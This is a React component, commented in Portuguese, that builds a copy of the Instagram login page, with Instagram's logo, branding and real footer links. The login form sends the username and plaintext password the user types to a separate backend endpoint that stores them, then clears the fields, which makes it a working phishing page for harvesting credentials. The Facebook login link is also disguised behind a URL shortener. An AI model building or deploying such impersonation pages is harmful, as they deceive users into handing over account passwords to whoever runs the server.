import './index.scss';
import { useState } from 'react';
import axios from 'axios';

export default function Comps() {
  const [login, setLogin] = useState('');
  const [password, setPassword] = useState('');
  const [buttonHabilitado, setButtonHabilitado] = useState('botao-desabilitado');


  // Função que verifica se os campos estão preenchidos e se a senha tem pelo menos 6 caracteres
  function verificarInput(loginValue, passwordValue) {
    if (loginValue !== '' && passwordValue !== '') {
      if (passwordValue.length >= 6) {
        setButtonHabilitado('botao-habilitado');
      } else {
        setButtonHabilitado('botao-desabilitado');
      }
    } else {
      setButtonHabilitado('botao-desabilitado');
    }
  }

  // Função para enviar os dados
  async function AdicionarUser() {
    let url = 'http://localhost:3000/user/';

    if (login !== '' && password !== '') {
      if (password.length >= 6) {
        await axios.post(url, { login: login, password: password });
        setLogin('');
        setPassword('');
      } else {
        alert('Campo senha deve ter 6 ou mais caracteres');
      }
    } else {
      alert('Preencha todos os campos');
    }
  }

  // Atualiza o login e chama a verificação de campos
function mudancasdoLogin(e) {
  const loginValue = e.target.value;
  setLogin(loginValue);
  verificarInput(loginValue, password);
}

// Atualiza a senha e chama a verificação de campos
function mudancasdoPassword(e) {
  const passwordValue = e.target.value;
  setPassword(passwordValue);
  verificarInput(login, passwordValue);
}

  return (
    <div className="pagina-comps">
      <main>
        <div id="main-container">
          <div id="banner-container">
            <img src="assets/images/banner2.png" alt="Crie uma conta no Instagram" />
          </div>

          <div id="form-container">
            <div id="form-box">
              <img src="assets/images/logo_instagram.png" alt="Logo do Instagram" id="logo-insta" />
              <form id="login-form">
                <input type="text" placeholder="Número de telefone, usuário ou e-mail" className="campoInput" autoComplete="off" value={login} onChange={mudancasdoLogin}/>

                <input type="password" placeholder="Senha" className="campoInput" value={password} onChange={mudancasdoPassword}/>

                <button type="button" className={buttonHabilitado} id="btn_login" onClick={AdicionarUser}><a href='https://www.instagram.com/' target="_blank"></a>Entrar</button>
              </form>

              <div className="separator">
                <div className="line"></div>
                <span>Ou</span>
              </div>

              <div id="other-links">
                <div id="facebook-login">
                  <a href="https://encurtador.com.br/6wEqk" target="_blank">
                    <img src="assets/images/logo_facebook.svg" alt="Logo do Facebook" />
                    <span>Entrar com o Facebook</span>
                  </a>
                </div>

                <div id="forgot-pass">
                  <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Esqueceu a senha?</a>
                </div>
              </div>
            </div>

            <div id="register-container">
              <p>
                Não tem uma conta? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Cadastre-se</a>
              </p>
            </div>

            <div id="get-app-container">
              <p>Obtenha o aplicativo</p>
              <a
                href="https://apps.apple.com/br/app/instagram/id389801252"
                target="_blank"
              >
                <img
                  src="assets/images/apple_btn.png"
                  alt="Botão para baixar o Instagram na Apple Store"
                />
              </a>
              <a
                href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=pt_BR&gl=US&pli=1"
                target="_blank"
              >
                <img
                  src="assets/images/gplay_btn.png"
                  alt="Botão para baixar o Instagram na Play Store"
                />
              </a>
            </div>
          </div>
        </div>
      </main>

      <footer>
        <nav>
          <ul id="footer-links">
            <li>
              <a href="https://about.meta.com/" target="_blank">Meta</a>
            </li>
            <li>
              <a href="https://about.instagram.com/" target="_blank">Sobre</a>
            </li>
            <li>
              <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
            </li>
            <li>
              <a href="https://about.instagram.com/about-us/careers" target="_blank">Carreiras</a>
            </li>
            <li>
              <a href="https://help.instagram.com/" target="_blank">Ajuda</a>
            </li>
            <li>
              <a href="https://developers.facebook.com/docs/instagram-platform" target="_blank">API</a>
            </li>
            <li>
              <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank">Privacidade</a>
            </li>
            <li>
              <a href="https://help.instagram.com/581066165581870/" target="_blank">Termos</a>
            </li>
            <li>
              <a href="https://www.instagram.com/explore/locations/" target="_blank">Localizações</a>
            </li>
            <li>
              <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
            </li>
            <li>
              <a href="https://www.threads.net/" target="_blank">Threads</a>
            </li>
            <li>
              <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Carregamento de contatos e não usuários</a>
            </li>
            <li>
              <a href="#" target="_blank">Meta Verified</a>
            </li>
          </ul>
        </nav>
        <p id="copyright">&copy; 2024 Instagram From Meta</p>
      </footer>
    </div>
  );
}
